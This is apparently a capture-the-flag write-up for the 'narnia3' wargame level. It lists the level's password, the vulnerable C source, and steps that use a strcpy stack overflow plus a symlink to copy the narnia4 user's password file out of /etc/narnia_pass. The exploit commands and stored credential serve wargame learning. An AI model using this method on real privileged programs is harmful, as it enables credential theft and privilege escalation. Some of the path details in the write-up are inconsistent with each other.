# username / password
narnia3 / 2xszzNl6uG
# concept
* stack buffer overflow
# sourcecode
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```
# method of solve
* the way the binary works is that it takes in a file as an argument and copies the file's contents to another file, which by default is `/dev/null`
* the code is vulnerable to stack buffer overflow due to its use of the following `strcpy` function:
```
strcpy(ifile, argv[1]);
```
* the associated buffer is this:
```
char ifile[32];
```
* which means that if the length of the command argument is in excess of 32 bytes, it will overflow into the other buffer, which is...
```
char ofile[16] = "/dev/null";
```
* so we can fill the `ifile` buffer with a directory that we control that is 32 bytes long, such as `/tmp/...narnia3/bigdirectoryname`
* the `second part` which comes after `/tmp/...narnia3/bigdirectoryname` will overwrite the `ofile` buffer, replacing the write file which is `/dev/null` by default
* we want that second part to be `/tmp/...narnia3/link`, and we want this file to be a symbolic link to the to the `narnia4` user's password file:
```
ln -s /etc/narnia_pass/narnia4 /tmp/...narnia3/bigdirectoryname/tmp/frog
touch /tmp/frog
```
* now we can put the whole payload together, which will take in the big 32-byte directory name, followed by a shorter filepath in the `tmp` directory
```
/narnia/narnia3 /tmp/...narnia3/bigdirectoryname/tmp/frog
```
* the password will be copied to the `/tmp/frog` file
